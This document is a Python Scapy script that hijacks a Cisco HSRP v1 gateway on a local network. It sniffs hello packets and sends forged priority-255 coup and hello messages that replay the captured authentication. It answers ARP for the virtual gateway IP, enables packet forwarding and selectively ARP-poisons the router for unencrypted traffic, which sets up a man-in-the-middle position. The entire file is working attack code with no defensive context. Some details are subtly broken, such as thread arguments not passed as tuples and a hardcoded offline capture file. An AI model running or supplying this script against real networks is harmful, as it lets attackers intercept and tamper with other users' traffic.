#script tested working in kali

from scapy.all import *
import threading
import netifaces as ni
import ipaddress

# change as necessary
interface = "eth0"
debug = True

#not in use
class v2(Packet):
    name="HSRPv2"
    fields_desc = [ BitField("twobyte", 0x0128, 16),
                    BitField("version", 2, 8),
                    BitField("opcode", 1, 8),
                    BitField("state", 1, 8),
                    BitField("ipver", 4, 8),
                    BitField("group", None, 16),
                    BitField("identifier", 0x34ed1b888888, 48),
                    BitField("priority", 0x000000ff, 32),
                    BitField("hellotime", 0x00000bb8, 32),
                    BitField("holdtime", 0x00002710, 32),
                    BitField("virtualip", None, 32),
                    BitField("padding", 0, 112),
                    BitField("auth", 0x636973636f000000, 64) ]

myip = ni.ifaddresses(interface)[ni.AF_INET][0]["addr"]
mymac = ni.ifaddresses(interface)[ni.AF_LINK][0]["addr"]
mynetmask = ni.ifaddresses(interface)[ni.AF_INET][0]['netmask']
myprefix = ipaddress.IPv4Network(f"0.0.0.0/{mynetmask}").prefixlen
mynetwork = ipaddress.ip_interface(f"{myip}/{myprefix}").network

hsrpfound = False
version: int
pkcopy: Packet

def find_hsrp():
    #consider offline="filename" to test with pcap file
    print("Listening for HSRP packets on UDP port 1985...")
    sniff(prn=check_hsrp, filter="udp and udp dst port 1985", stop_filter=hsrp_found, offline="hsrp v1.pcap")
    if hsrpfound:
        return True
    return False

#called by sniff() to check if hsrp is found, stop condition
def hsrp_found(packet):
    return hsrpfound == True

#called by sniff() to check for valid hsrp
def check_hsrp(packet):
    global version
    global hsrpfound
    global pkcopy
    if packet[HSRP].version == 0:
        if not check_v1_fields(packet):
            return
        print("Active HSRP found, version 1")
        print("Active router group: ", packet[HSRP].group)
        print("Active router priority: ", packet[HSRP].priority)
        print("Active router IP: ", packet[IP].src)
        print("Virtual gateway IP: ", packet[HSRP].virtualIP)
        print("HSRP Hello time: ", packet[HSRP].hellotime)
        version = 1
        hsrpfound = True
        pkcopy = packet
    else:
        print("HSRPv2 not yet supported")
        version = 2
        hsrpfound = True
        pkcopy = packet
        print(bytes(packet).hex())

#make sure hsrp packet is valid
def check_v1_fields(packet):
    try:
        assert packet[HSRP].version == 0
        assert packet[HSRP].opcode == 0
        assert packet[HSRP].state == 16
        assert packet[IP].dst == "224.0.0.2"
    except:
        return False
    return True

def send_hsrp(packet):
    print("Hijacking HSRP...")
    pkt = Ether(dst=packet[Ether].dst)/IP(dst=packet[IP].dst, ttl=packet[IP].ttl)/UDP(sport=1985, dport=1985)/HSRP(opcode=1, state=16, hellotime=packet[HSRP].hellotime, holdtime=packet[HSRP].holdtime, priority=255, group=packet[HSRP].group, auth=packet[HSRP].auth, virtualIP=packet[HSRP].virtualIP)
    
    sendp(pkt)
    send_initial_arp(packet)
    pkt[HSRP].opcode = 0

    sendp(pkt)
    send_initial_arp(packet)
    sendp(pkt, inter=packet[HSRP].hellotime, loop=1)

def send_initial_arp(packet):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=packet[HSRP].virtualIP, hwdst="ff:ff:ff:ff:ff:ff", pdst=packet[HSRP].virtualIP)
    sendp(pkt, inter=packet[HSRP].hellotime)

def start_subinterface(pkt):
    print(f"Starting sub interface with IP: {pkt[HSRP].virtualIP} on {interface}")
    subprocess.run(["ifconfig", f"{interface}:1", pkt[HSRP].virtualIP, "netmask", mynetmask, "up"])

def enable_forwarding():
    print("Enabling packet forwarding on linux:")
    subprocess.run("sysctl -w net.ipv4.ip_forward=1".split())

def change_default_gw(routerIP):
    print(f"Changing default gateway to: {routerIP}")
    subprocess.run(f"route add default gw {routerIP} {interface}".split())

# respond to arp to virtual ip from network
def start_arp_responder(pkt):
    virtualIP = pkt[HSRP].virtualIP
    filterstring = f"arp and dst host {virtualIP} and src host not {virtualIP} and ether src host not {mymac}"
    sniff(prn=arp_respond, filter=filterstring)

def arp_respond(pkt):
    victimEther = pkt[Ether].src
    victimIP = pkt[ARP].psrc
    virtualIP = pkcopy[HSRP].virtualIP
    pkttosend = Ether(dst=victimEther)/ARP(op=2, psrc=virtualIP, hwdst=victimEther, pdst=victimIP)
    sendp(pkttosend)
    return f"Responded to ARP request from {victimIP}"

# start poisoning router's arp cache only for potentially vulnerable traffic
def start_selective_poisoning(pkt):
    routerIP = pkt[IP].src
    virtualIP = pkt[HSRP].virtualIP
    filterstring = f"(tcp or udp) and dst port not 443 and dst port not 22 and src host not ({routerIP} or 0.0.0.0) and ether src host not {mymac}"
    sniff(prn=arp_poison, filter=filterstring)

def arp_poison(pkt):
    virtualIP = pkcopy[HSRP].virtualIP
    try:
        victimIP = pkt[IP].src
        dstIP = pkt[IP].dst
        if ipaddress.ip_address(dstIP).is_multicast or ipaddress.ip_address(victimIP) not in mynetwork:
            return
        arppkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, psrc=victimIP, pdst=virtualIP)
        sendp(arppkt)
        if debug:
            return f"Spoofing ARP from {victimIP}, trigger: packet sent to {dstIP}"
    except:
        if debug:
            print("Not IP packet")
            pkt.show()
    return


if __name__ == "__main__":
    if find_hsrp():
        if version == 1:
            enable_forwarding()
            start_subinterface(pkcopy)
            change_default_gw(pkcopy[IP].src)
            print(f"Filtering based on interface: {interface} {myip}")
            arp_thread = threading.Thread(target=start_arp_responder, args=(pkcopy))
            arp_thread.start()
            selective_poison = threading.Thread(target=start_selective_poisoning, args=(pkcopy))
            selective_poison.start()
            send_hsrp(pkcopy)